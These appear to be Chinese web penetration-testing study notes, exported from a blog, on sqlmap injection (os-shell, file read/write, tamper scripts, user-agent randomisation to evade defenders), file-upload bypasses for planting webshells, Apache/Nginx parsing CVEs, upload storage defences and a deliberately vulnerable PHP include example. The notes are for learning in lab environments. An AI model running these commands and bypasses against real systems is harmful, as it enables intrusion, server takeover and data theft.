对提供的 URL 进行 SQL 注入测试。\n存在注入点\n且为MySQL数据库\n\n\n\n\n\n3.引出命令：\n–os-cmd&#x3D;（在目标系统上执行操作系统命令）–os-shell (获取一个操作系统 shell（命令行）连接)–sql-shell**（执行SQL命令）**\n\n\n–os-shell (**获取一个操作系统 shell（命令行）连接)**python sqlmap.py -u “http://demo01/sqli/new.php?id=1“  -sql-shell\nselect version(); （获取数据库版本信息）\n\n\n\n\n\nselect * from admin; （查询表的信息）\n\n\n输入exit退出\n\n–os-cmd&#x3D; （在目标系统上执行操作系统命令）\n\n–os-cmd&#x3D;calc （执行计算器）\n询问语言（直接回车默认即可）\n\n\n\n如果路径自动查询失败，选则2（自定义路径）\n\n\n\n并输入对应文件名的相关目录：（注意：直接输入路径即可，不用带引号)\n\n\n\ndo you want to retrieve the command standard output? [Y&#x2F;n&#x2F;a]在 SQLMap 执行期间询问是否要获取命令的标准输出（command standard output）（输入a即可）\n\n\n\n–os-shell (获取一个操作系统 shell（命令行）连接)\n\npython sqlmap.py -u “http://demo01/sqli/new.php?id=1“ –os-shell\n\n询问语言（直接回车默认即可）\n\n\n如果路径自动查询失败，选则2（自定义路径）\n\n并输入对应文件名的相关目录：（注意：直接输入路径即可，不用带引号)\n\n\n\nos-shell&gt; ver （显示当前操作系统的版本信息）并输入y，得到回显\n\n\n\nos-shell&gt; ipconfig （显示ip地址）并输入a或y\n\n\n\n\n4.引出文件：\n–file-read**（文件读取）**–file-write –file-dest(写入操作)\n\n\n--file-read （文件读取)\n\npython sqlmap.py -u “http://demo01/sqli/new.php?id=1“ –file-read “d:\\1.txt”\n\n\nSQLMap 在执行时询问是否要确认从后端数据库管理系统（DBMS）文件系统成功下载了指定的远程文件 ‘f:&#x2F;1.txt’。这里默认yes\n\n打开保存的文件，发现成功读取\n\n\n\n--file-write 和 --file-dest 是 SQLMap 中用于执行文件写入操作的选项。\n\n–file-write:此选项用于指定要写入的文件的内容。你需要提供一个文件的内容或者文件路径，SQLMap 将尝试将该内容写入目标文件。\n\n–file-dest:此选项用于指定要写入内容的目标文件路径。你需要提供要写入的文件的目标路径，SQLMap 将尝试将指定的内容写入该文件。\n\npython sqlmap.py -u “http://demo01/sqli/new.php?id=1“ –file-write&#x3D;”d:\\1.txt” –file-dest&#x3D;”c:\\123.txt”\n\n\n\n二、提交方法-POST&amp;HEAD&amp;JSON\n测试：Post Cookie Json–data “”–cookie “”-r 1.txt（推荐使用）\n\n1.在处理POST请求的时候，应该首先在页面测试2.输入用户名和密码进行登录提交表单的测试\n3.并进行抓包，查看对应&#x3D;&#x3D;登录文件中负载的表单数据格式&#x3D;&#x3D;4.普通的字符串格式：”uname&#x3D;test&amp;pass&#x3D;test”\n–data “”–数据 “”\n该选项用于指定要发送的 POST 数据。在你的命令中，--data 的值被设置为空字符串，表示没有提供具体的 POST 数据。通常，你需要在引号内提供实际的 POST 数据，例如 **--data &quot;**uname=test&amp;pass=test**&quot;**。\n注意：指定URL需要指定，接受POST数据的URL，而不是登录的URL\n是：http://testphp.vulnweb.com/userinfo.php（**抓取到包中是有负载数据，才是目标URL）**\n\n\n\npython sqlmap.py -u “http://testphp.vulnweb.com/userinfo.php” --data &quot;uname=test&amp;pass=test&quot;\n\nu “http://testphp.vulnweb.com/userinfo.php“\n\n指定目标 URL，这里是登录页面的 URL。\n\n\n-data “uname&#x3D;test&amp;pass&#x3D;test”:\n\n指定 POST 请求的数据，这里是用户名 uname 和密码 pass，分别设置为 “test”。成功实现POST数据注入：\n\n\n\n–cookie “”（原理一样，只做data的演示）该选项用于指定要发送的 Cookie 信息。在你的命令中，–cookie 的值也被设置为空字符串，表示没有提供具体的 Cookie 信息。通常，你需要在引号内提供实际的 Cookie 信息，例如 –cookie “sessionID&#x3D;123456”\n\n\n推荐使用-r 1.txt\n\n该选项用于从文件中读取请求内容。在你的命令中，-r 后面的值是文件路径（1.txt），表示 SQLMap 将从该文件中读取请求内容，包括请求头和请求体\n\n1.首先进行页面测试，并进行抓包\n2.在抓包内容下查看，携带POST请求数据的页面：http://testphp.vulnweb.com**/userinfo.php**\n3.选中对应的页面数据包，复制请求标头\n4.复制请求数据包：uname&#x3D;test&amp;pass&#x3D;test\n5.将复制的东西，创建一个head.txt文件，并存放在sqlmap的目录下G:\\develop\\safety\\ONE-FOX集成工具箱_V3.0魔改版_by狐狸\\gui_scan\\sqlmap\n6.将请求数据包中的数据，用*打上注入点，这样方便快捷注入\n\n如果没有注入点，自动注入，无法确定在哪里注入，会浪费很多时间\n\n7.sqlmap，实行注入：python sqlmap.py-r .\\head.txt\n\n空格默认\n\nQLMap 正在测试一个自定义的 POST 参数 #1*，以确定它是否是动态生成的。\n\ngot a 302 redirect to ‘http://testphp.vulnweb.com:80/login.php‘:\n\n在测试过程中，得到了一个 HTTP 302 重定向到 ‘http://testphp.vulnweb.com:80/login.php&#39;。Do you want to follow? [Y&#x2F;n]:\n\nSQLMap 询问是否要跟随这个重定向。即是否要按照新的 URL 继续测试。\n\n\n\n\n\n成功注入\n\n\n\n\n5.json格式：{“username”:“admin”,“password”:“123456”}\n\n抓包，指定URL：http://demo01/sqli/json_check.php\n\n选中对应的页面数据包，复制请求标头\n\n复制数据包：\n{“username”: “admin”,“password”: “123456”}\n4.将复制的东西，&#x3D;&#x3D;创建一个json.txt&#x3D;&#x3D;文件，并存放在sqlmap的目录下G:\\develop\\safety\\ONE-FOX集成工具箱_V3.0魔改版_by狐狸\\gui_scan\\sqlmap\n5.将请求数据包中的数据，用*打上注入点，这样方便快捷注入\n如果没有注入点，自动注入，无法确定在哪里注入，会浪费很多时间\n{“username”: “admin*****”,“password”: “123456*****”}\n6.打开sqlmap，实行注入：python sqlmap.py-r .\\json.txt\n7.SQLMap 发现了多个注入点，并要求你选择一个用于后续注入测试的注入点。以下是对该提示的解释：默认选0即可\n[0] place: (custom) POST, parameter: JSON #1*, type: Single quoted string (default):\n选项 0 表示注入点位于自定义 POST 请求的 JSON 参数 #1*，类型是单引号字符串。这是默认选择。[1] place: (custom) POST, parameter: JSON #2*, type: Single quoted string:\n选项 1 表示注入点位于自定义 POST 请求的 JSON 参数 #2*，类型是单引号字符串。[q] Quit:\n选项 q 表示退出选择，不选择任何注入点。\n\n\n\n\n\n\n6.无论哪种格式，为了保证数据包完整性都推荐使用-r 1.txt\n该选项用于从文件中读取请求内容。在你的命令中，-r 后面的值是文件路径（1.txt），表示 SQLMap 将从该文件中读取请求内容，包括请求头和请求体\n\n如果是json格式的POST数据包，使用–data去注入存在以下问题\n\n抓包，指定URL：http://demo01/sqli/json_check.php\n\n复制数据包：{“username”:“admin”,“password”:“123456”}\n\n打开sqlmap，实行注入：python sqlmap.py -u “http://demo01/sqli/json_check.php“ –data “{“username”:”admin”,”password”:”123456”}”\n\n\n\n\n**报错all tested parameters do not appear to be injectable😗*所有测试过的参数似乎都不可注入。\n\n\n\n原因：由于引号的影响，无法正确的读取参数，插入注入点，所以报错无法注入或没有注入点\n\n\n\n即使加入*，标明注入点，依旧无法正常注入\n\n\n\n#绕过模块-Tamper脚本-使用&amp;开发\n测试：base64注入 有过滤的注入–tamper&#x3D;base64encode.py–tamper&#x3D;test.py\n\n1.测试GET页面，抓包，选中带有负载数据的页面http://demo01/sqli/base64.php?id==MQ==\n2.由于注入页面中有id&#x3D;MQ&#x3D;&#x3D;，判定是base64加密后的数据3.实行sqlmap执行查看注入点：python sqlmap.py -u “http://demo01/sqli/base64.php?id==MQ==“4.报错无注入点：原因base64编码，导致注入语句怎样拼接都无法成功解码注入\n5.采用sqlmap中自带的Tamper脚本，解决base64编码解码问题\n\n\n6.引入Tamper脚本base64encode.py，再次实行注入：python sqlmap.py -u “3.实行sqlmap执行查看注入点：python sqlmap.py -u “http://demo01/sqli/base64.php?id==MQ==“” –tamper&#x3D;base64encode.py成功注入\n\nTamper脚本开发思路：（1）前期分析检测判断过滤条件，（2）分析过滤条件实行转换为对应的python代码，（3）将代码放入sqlmap实验是否可以绕过过滤\n#分析拓展-代理&amp;调试&amp;指纹&amp;风险&amp;等级）1、后期分析调试：\nv #详细的等级(0-6)0：只显示Python的回溯，错误和关键消息。1：显示信息和警告消息。2：显示调试消息。3：有效载荷注入。4：显示HTTP请求。5：显示HTTP响应头。6：显示HTTP响应页面的内容\n\n-v (0-6) 查看创建的Tamper脚本是否生效\n对比前后是否使用Tamper脚本，的注入符号\n\n不使用Tamper脚本python sqlmap.py -u “http://demo01/sqli/base64.php?id==MQ==&quot;**” -v 4\n\n\n\n\n\n使用Tamper脚本python sqlmap.py -u “http://demo01/sqli/new.php?id=1” -tamper&#x3D;test -v 4\n\n\n\n发现使用脚本前后，注入符号由OR更改为Or，证明脚本执行成功\n\n2、–proxy “http://xx:xx” #代理注入\npython sqlmap.py -u “http://demo01sqli/new.php?id=1” –level&#x3D;3 –risk&#x3D;2 –proxy “http://127.0.0.1:8080/”\n\n\n3、打乱默认指纹：\n–user-agent “” #自定义user-agent–random-agent #随机user-agent\n\n面试问题：由于显示的数据包user-agent会携带一些固有流量特征，会被蓝队进行防护和识别。\nsqlmap的固有流量特征：数据包user-agent中会默认其版本号\nUser-agent: sqlmap&#x2F;1.7.2.16#dev (https://sqlmap.org)\n解决方式：通过自定义或者随机ua头，避免被过滤\n通过自定义user-agent：–user-agent “”\n随机user-agent：python sqlmap.py -u “http://192.168.137.1:84/sqli/new.php?id=1” -v 4 –random-agent\n\n面试问题：一个网址访问过快，大量的请求，频繁的扫描行为，可能引起网络防御工具的注意。\n解决方式：使用延迟响应语句python sqlmap.py -u “http://192.168.137.1:84/sqli/new.php?id=1” -v 4 –random-agent –time-sec&#x3D;(2,5)--time-sec=5#延迟响应，默认迟为5秒。\n-time-sec&#x3D;5 是sqlmap的一个命令行选项，用于指定在检测过程中用于基于时间的盲注攻击的时间延迟范围。设置了时间延迟的范围，以使sqlmap能够在进行基于时间的盲注攻击时更灵活地进行操作。时间延迟是在进行盲注时，根据响应的延迟时间来判断是否成功执行了SQL语句。\n\n4、使用更多的测试：–level –risk等级限制\n总结：在使用盲注扫描注入点的时候，可以将规则等级进行设置提示，可能会扫到其他的注入点。\n\n将源码设置为两个可注入点：分别为id和User-Agent\n\n当使用sqlmap进行扫描的时候，不使用自己创建的Tamper脚本，默认扫描注入点：\n首先使用默认等级进行扫描：\n\npython sqlmap.py -u “http://192.168.137.1:84/sqli/new.php?id=1”\n发现有过滤，无法寻找到注入点\n\n\n\n在执行代码后&#x3D;&#x3D;规定等级：&#x3D;&#x3D;–level&#x3D;3（测试水平等级） –risk&#x3D;2（执行的风险等级） python sqlmap.py -u “http://192.168.137.1:84/sqli/new.php?id=1” –level&#x3D;3 –risk&#x3D;2\n发现找到注入点：但是不是先前判断的id注入点，而是不知晓的User-Agent原因：使用高等级的规则进行查询扫描注入点的时候，又可能会扫描到其他注入点\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"047-WEB攻防-PHP应用&文件上传&函数缺陷&条件竞争&二次渲染&黑白名单&JS绕过","url":"/2025/09/16/047-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7&%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89&%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93&%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95&JS%E7%BB%95%E8%BF%87/","content":"小迪文件上传47~ 笔记总结\n\n学习前必读：1、课前一定要明白：无文件解析&#x3D;&#x3D;安全问题上，格式解析是一对一的（不能jpg解析php）&#x3D;&#x3D;换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析\n2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！\n#测试环境安装参考：https://github.com/ffffffff0x/f8x\nhttps://github.com/fuzzdb-project/fuzzdb\nhttps://github.com/sqlsec/upload-labs-docker\n1.docker安装\nf8x -d 或 f8x -docker\n2.进入文件夹\ncd upload-labs-docker切换到upload-labs-docker目录\n3.一键部署\ndocker-compose up -d\n1、前端js如何判断是否是前端验证呢？\n\n首先抓包监听，如果上传文件的时候&#x3D;&#x3D;**还没有抓取到数据包，**但是浏览器就**提示文件类型不正确**的话，&#x3D;&#x3D;那么这个多半就是前端校验了\n\n\n查看页面源代码发现有进行过滤\n\n\n如何绕过？\n第一种方式\n\n首先将木马文件的后缀修改为jpg，可以通过过滤的文件后缀\n通过burp抓取到数据包，修改回对应的木马文件解析后缀\n木马程序成功上传，即可通过哥斯拉，获取权限\n\n\n发送数据包 即可上传成功\n第二种方法\n\n鼠标右击检查\n选取页面元素 选中upload\n将checkfilesuffix改为 true即可上传\n\n\n2、解析上传.htaccess（配置 Apache Web 服务器行为的配置文件）首先上传php文件发现报错显示文件格式错误\nAddType application&#x2F;x-httpd-php .png\n.htaccess 修改解析配置文件借助这个配置让.png的命名文件当做类型application&#x2F;x-httpd-php执行(php的类型)当做php执行\n\n绕过方法\n\n将包含木马的php文件后缀修改为 .png，后上传\n\n通过burp进行抓包，并将文件后缀修改为**.htaccess**,并将代码内容修改为AddType application&#x2F;x-httpd-php .png\n\n注意：直接访问对应上传1.png的路径http://192.168.162.128:30002/upload/1.png)，访问http://192.168.162.128:30002/upload/.htaccess 这个是解析木马文件的规则，直接访问会报错403\n\n\n\n\n\n如果使用哥斯拉上传的时候出现了\n\n修改你的有效载荷为PhpDynamicPayload\n\n3、MIME类型-（修改文件类型，抓包修改回文件类型）Content-Type：image&#x2F;png\n这里我们直接上传php文件 显示文件类型不正确\n\n绕过方法\n\n1.将包含木马的php文件后缀修改为png\n\n2.使用burpsuite抓包 将png文件后缀修改回php\n\n3.上传成功后访问文件url路径\n\n4.哥斯拉连接\n\n\n\n\n4、文件头判断\n\n绕过方法\n\n将包含一句话木马的php文件前面加入文件头 （GIF89a8）gif文件默认的文件头\n将php文件上传 用burpsuite进行抓包\n对文件的content-type进行修改为：image&#x2F;gif\n成功上传 访问图片链接 \n哥斯拉获取权限\n\n\n\n5、黑名单-过滤不严\n\n这行代码使用str_ireplace函数来检查上传文件的名称（$name），如果文件名中包含黑名单中的任何扩展名，就会将这些扩展名替换为空字符串。str_ireplace函数是不区分大小写的，这意味着即使扩展名是大写或混合大小写，也会被替换掉。\n绕过方法\n\n上传php文件根据代码提示黑名单对关键字有进行过滤\n抓包 将php文件后缀修改为.pphphp（双写后缀绕过）或者修改为php2就能绕开过滤\n\n6、黑名单-过滤不严（二）\n同样的跟上提一样\n\nwindows：大小写过滤不敏感\nlinux：大小写过滤铭感\n\n绕过方法\n\n1.将木马文件的后缀使用大小写绕过 .phP 或者使用.php2不包含在黑名单里面的后缀即可上传成功\n\n7.低版本GET-%00截断URL路径出现在POST的URL中自动解码一次&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;x.php%00\n原理：将木马文件以.jpg格式上传，可以获得到一个对应.jpg文件img src&#x3D;”.&#x2F;upload&#x2F;9720240216044425.jpg通过修改POST中URL路径使用%00截取，也就是说只有前面x.php被拼接到名称中，后面都被舍弃，在文件解析时候，依照被拼接的x.php进行文件解析，木马文件被成功解析\n\n如何绕过\n\n上传文件 抓包发送到repeater 查看返回包数据 显示php版本为5.2.17\n将php修改为jpg 上传抓包 将post 中的url路径加上**&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;a.php%00**\n访问图片地址复制到哥斯拉\n链接后面获取权限\n\n\n8.低版本POST-%00截断\n手工解码一次…&#x2F;upload&#x2F;x.php%00 二次解码\nURL路径出现在POST下面的数据包中，需要手动解码\n绕过方法\n\n1.上传木马文件为.jpg格式抓包 发现url路径出现在post下面的数据包中\n\n将.&#x2F;upload&#x2F;后面加上**x.php%00，并选中该行，右键选择Convert selection → URL →URL-decode**将所选内容转换为 URL →→URL 解码（进行手动转码）\n\n访问图片地址 复制地址\n\n哥斯拉链接\n\n\n\n\n* \n\n9、黑名单-过滤不严(三)\n如何绕过\n\n上传文件 抓包发送到 Intruder\n选择Clear$清除所有选中，选择 ∗ ∗ 木马文件后缀 p h p ，并按下 A d d 清除所有选中，选择木马文件后缀php，并按下Add清除所有选中，选择∗∗木马文件后缀php，并按下Add替换该后缀\n选择&#x3D;&#x3D;Payloads,Payload Options→Load导入对应php后缀替换字典\n选择右上角Start attack，发现Length的长度不同，1573的是没有替换成功的，1625是替换成功的（不是绝对的，还需要通过哥斯拉验证后妈是否可以连接才能确定）\n使用替换成功的后缀文件 上传 复制图片地址\n哥斯拉拉链接\n\n\n\n\n10、条件竞争\n\n\n如何绕过\n\n\n首先创建文件 写入条件竞争的一句话木马  ","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"048-WEB攻防-PHP应用&文件上传&中间件CVE解析&第三方编辑器&已知CMS漏洞","url":"/2025/09/16/048-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&%E4%B8%AD%E9%97%B4%E4%BB%B6CVE%E8%A7%A3%E6%9E%90&%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BC%96%E8%BE%91%E5%99%A8&%E5%B7%B2%E7%9F%A5CMS%E6%BC%8F%E6%B4%9E/","content":"小迪文件上传48~ 笔记总结\n#知识点：\n1、PHP-中间件-文件上传-CVE&amp;配置解析2、PHP-编辑器-文件上传-第三方引用安全3、PHP-CMS源码-文件上传-已知识别到利用\n\n演示案例：\n➢PHP-中间件-上传相关-Apache&amp;Nginx➢PHP-编辑器-上传相关-第三方处理引用➢PHP-CMS源码-上传相关-已知识别到利用\n\n#漏洞环境：vulhub （部署搭建）Vulhub - Docker-Compose file for vulnerability environment\nhttps://github.com/vulhub/vulhub\n\n1、打开虚拟机 ，将下载好的对应文件vulhub-master通过xftp7传输至虚拟机上\n2、进入对应的vulhub-master目录\n3、在提供的Vulhub - Docker-Compose file for vulnerability environment查找对应想要复现的漏洞如：Apache HTTPD 多后缀解析漏洞，复制其Path路径httpd/apache_parsing_vulnerability/\n4、将复制的路径，继续在相关目录下打开，在虚拟机中输入：cd httpd/apache_parsing_vulnerability/ 然后使用docker compose up -d 拉取对应配置。\n5、访问对应端口\n6、需要配置其他靶场，首先使用docker-compose down停止和删除使用 Docker Compose 启动的容器，然后再次查询想要复现的漏洞Apache HTTPD 换行解析漏洞（CVE-2017-15715），并复制其path：httpd&#x2F;CVE-2017-15715\n7、虚拟机中输入：cd httpd/CVE-2017-15715 然后使用docker compose up -d 拉取对应配置。\n\nPHP-中间件-上传相关-Apache&amp;Nginx由于PHP搭建常用中间件：IIS，Apache，NginxWeb搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传\n1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）漏洞条件\n\n\nApache2.4.0~2.4.29版本\n需要有文件上传\n需要有重命名文件的代码实现\n\n\n漏洞环境\n\ncd httpd&#x2F;CVE-2017-15715\ndocker compose builddocker compose up -d\n启动后 Apache运行在http://your-ip\n\n漏洞复现\n\n1、创建一个名为1.php的文件内容，上传该文件，并将filename（重命名修改为：evil.php）\n\n通过burp抓包，将evil.php后面多加一个空格（方便后期十六进制进制定位），并将数据包发送至repeater处\n\n将数据包的内容转换为Hex格式，定位到evil.php ，后方的20（预留空格处），将其修改为0a\n\n\n\n点击发送数据包，然后访问http://192.168.162.128:8080/evil.php（在evil.php后面加%0a）即可发现，phpinfo被执行了，该文件被解析为php脚本。但这个文件不是php后缀，说明目标存在解析漏洞：\n\n\n\n2.Apache HTTPD 多后缀解析漏洞（条件苛刻，忽略不计）Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件\nAddType text/html .htmlAddLanguage zh-CN .cn\n\n其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。\n以上就是Apache多后缀的特性。\n漏洞条件\n\n如果运维人员给.php后缀增加了处理器：\nAddHandler application/x-httpd-php .php\n那么，在有多个后缀的情况下，&#x3D;&#x3D;只要一个文件含有.php后缀的文件即将被识别成PHP文件，&#x3D;&#x3D;没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。\n\n漏洞环境\n\ncd httpd/apache_parsing_vulnerability/运行如下命令启动一个稳定版Apache，并附带PHP 7.3环境：\ndocker compose up -d\n\n漏洞复现\n总结：http://192.168.162.128/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。\n\n1、创建木马文件 3.php内容为：，重命名为apache.php.jpeg\n2、上传修改好的文件apache.php.jpeg ，并访问上传路径http://192.168.162.128**&#x2F;uploadfiles&#x2F;apache.php.jpeg**即可发现，phpinfo被执行了，该文件被解析为php脚本。\n\n\n\n3.Nginx 文件名逻辑漏洞（CVE-2013-4547）漏洞条件\n\n\nNginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7\n需要有文件上传\n\n\n漏洞环境\n\ncd &#x2F;opt&#x2F;vulhub-master&#x2F;cd nginx&#x2F;CVE-2013-4547docker compose up -d\n\n漏洞复现\n\n1、创建一个名为1.php的文件内容，修改此文件后缀 1.gif,上传该文件,抓包发送数据包至repeater，在filename&#x3D;”1.gif “其后加空格点击发送，查看发送成功\n复制发送成功数据包中&#x3D;&#x3D;上传文件的存储路径&#x3D;&#x3D;，并加上ip进行路由访问http://192.168.200.130:8080/uploadfiles/1.gif，将访问的数据包再次进行抓包，将抓取的数据包发送至repeater\n\n修改GET后的路径，&#x3D;&#x3D;将1.gif后面加上两个空格和.php，然后转Hex格式，将第二个空格20修改为00&#x3D;&#x3D;即可发现，phpinfo被执行了，该文件被解析为php脚本\n\n\n\n\n\n\n\n\n4.Nginx 解析漏洞复现漏洞条件\n\n\nNginx 1.x 最新版\n\nPHP 7.x最新版\n\n由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。\n\n\n 直接执行docker compose up -d启动容器，无需编译。\n\n漏洞环境\n\n\ncd &#x2F;opt&#x2F;vulhub-master&#x2F;\ncd nginx&#x2F;nginx_parsing_vulnerability\ndocker compose up -d\n\n\n\n\n\n\n漏洞复现\n\n\n随便上传一个图片抓包 发送到repeter 在文件的末尾加上索要执行的php代码\n\n将数据包发送至repeate，并点击发送，获取上传文件保存路\nPlease ensure you are uploading an image.如果出现这个看看你浏览器上面有没有显示success 如果有就代表执行成功\n\n\n将路径加ip地址，并在路径后面加上&#x2F;.php即可发现，phpinfo被执行了，该文件被解析为php脚本http://192.168.162.128/uploadfiles/87aa2ffbf3c5370b130361392aedf2ac.png/dsadsdas.php\n\n\n\n\nPHP-编辑器-上传相关-第三方处理引用复现漏洞环境：ueditor\n\n由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路\nUeditor编辑器任意文件上传漏洞_ueditor漏洞-CSDN博客\n\n影响范围\n\n该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。\n\n漏洞复现\n\n\n开启网址服务，通过目录扫描发现有ueditor，访问该路径跳出ueditor的内容\n\n将以下代码中的网址修改为：对应的网址服务地址，然后将代码以浏览器打开，输入远程图片地址（带有后门图片马），在网址后加上?.aspx\n\n会自动上传图片文件，并将其修改为aspx格式，并会返回对应的上传文件路径，将其进行访问，并使用哥斯拉连接后门即可\n\n\n\n参考：https://cloud.tencent.com/developer/article/2200036参考：https://blog.csdn.net/qq_45813980/article/details/126866682引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全\nPHP-CMS源码-上传相关-已知识别到利用复现漏洞环境：通达OA-V11.2\n\n从未知的源码体系测试原生态上传安全，现在是&#x3D;&#x3D;已知CMS&#x3D;&#x3D;（创建和管理数字内容的软件应用程序）源码架构，利用已知的漏洞测试\n\n漏洞复现\n\n\n打开通达系统服务IP地址\n将对应的ip地址使用ONE-FOX工具箱中的Liqun工具箱进行分析\n成功获取Cookie信息后，切换功能为后台上传GetShell，成功上传\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"049-WEB攻防-文件上传&存储安全&OSS对象&分站&解析安全&解码还原&目录执行","url":"/2025/09/16/049-WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8&OSS%E5%AF%B9%E8%B1%A1&%E5%88%86%E7%AB%99&%E8%A7%A3%E6%9E%90%E5%AE%89%E5%85%A8&%E8%A7%A3%E7%A0%81%E8%BF%98%E5%8E%9F&%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8C/","content":"小迪文件上传49~ 笔记总结\n#文件-解析方案-执行权限&amp;解码还原1、执行权限\n文件上传后存储目录不给执行权限\n原理：开启禁止目录执行，将服务器的文件上传后存储目录，取消读取和执行的权限\n\n\n\n由于文件上传功能并未做过滤，直接上传包含后门的木马文件shell.php上传成功即可发现，phpinfo被执行了，该文件被解析为php脚本\n\n当在小皮网址配置的&#x3D;&#x3D;选择安全配置→开启禁止目录执行→将禁止执行的目录设置为上传目录（&#x2F;1&#x2F;upload）&#x3D;&#x3D;\n\n开启后，再次访问上传的木马文件，发现报错403，至此文件上传漏洞不能被利用\n\n\n\n\n如何判断\n1.如果目录下已经上传进去木马文件，访问其上传路径发现报错403禁止访问，可能是文件上传后存储目录不给执行权限\n\n\n2、解码还原\n数据做存储，解析固定（文件后缀名无关）文件上传后利用编码传输解码还原\n\n\n当服务器把上传的文件，利用base64编码编码为数据存储，也就是说从根本上解决了文件上传漏洞的问题&#x3D;&#x3D;，以数据存储就没有其他类型的文件解析即使上传后门文件，最后也是被当成图片去解析，由固定的协议去解析数据（data:image&#x2F;png;base64，base数据）&#x3D;&#x3D;\n\n\n// 处理文件上传if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_FILES[&#x27;file&#x27;])) &#123;    // 获取上传的文件信息    $file = $_FILES[&#x27;file&#x27;];    // 获取文件名和临时文件路径    $filename = $file[&#x27;name&#x27;];    $tmpFilePath = $file[&#x27;tmp_name&#x27;];    **// 将文件内容转换为Base64编码    $base64Data = base64_encode(file_get_contents($tmpFilePath));**    // 输出Base64编码的文件内容    echo $base64Data;    // 如果是图片文件，可以将其在页面上显示    echo &#x27;&lt;img src=&quot;data:image/jpeg;base64,&#x27; . $base64Data . &#x27;&quot; alt=&quot;上传的图片&quot;&gt;&#x27;;&#125;?&gt;\n\n\n如何判断是解码还原\n在上传文件的时候，抓取数据包，如果发现是&#x3D;&#x3D;由固定的协议（data:image&#x2F;png;base64，base数据）则就是解码还原&#x3D;&#x3D;\n\n\n#文件-存储方案-分站存储&amp;OSS对象1、分站存储upload.xiaodi8.com 上传images.xiaodi8.com 存储&#x3D;&#x3D;（另一台服务器，目录权限锁死，只提供存储服务，不提供解析服务，即使上传木马文件，连接后门也无用）&#x3D;&#x3D;\n存储图片在另一台服务，有关于上传文件还使用base64编译为数据，进一步放置了文件上传的隐患\n如何判断分站存储？\n上传图片后，查看图片URL地址中的域名是否和目标上传地址一致，如果不一致则是分站存储\n\n\n\n2、OSS对象Access控制-OSS对象存储-Bucket对象\n上传的文件只能当作一个网盘来看，不提供解析服务，只提供下载\n\n#如何判断\n如果访问上传的文件路径，发现访问及下载，多半是OSS对象\n\n\n\n\n\n\n#安全绕过以上方案除目录设置权限如能&#x3D;&#x3D;换目录解析绕过外，&#x3D;&#x3D;\n其他均无解\n\n控制上传文件的的存储目录，绕开开启限制执行的目录即可\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"050-WEB攻防-PHP应用&文件包含&LFI&RFI&伪协议编码算法&无文件利用&黑白盒","url":"/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&LFI&RFI&%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&%E9%BB%91%E7%99%BD%E7%9B%92/","content":"小迪文件包含50~ 笔记总结文件包含-原理&amp;分类&amp;利用&amp;修复1、原理程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞\n文件包含 包含的文件就被当做当前脚本语言去代码执行了\n2、漏洞原因：1、使用文件包含函数2、包含的文件可控\n3、漏洞简单复现1.在本地网站下面创建一个include.php文件 代码写如include($_GET[&#39;file&#39;]);使用include函数来包$_GET[&#39;file&#39;]，这是危险的做法，因为用户可以通过修改URL参数传递恶意文件路径，导致安全漏洞。\n2.创建1.txt，写入\n3.访问对应文件路径，并传入参数http://192.168.232.195/demo01/include.php?file=1.txt 相当于include（‘2.txt’）；\n\n4、分类本地包含-Local File Include-LFI远程包含-Remote File 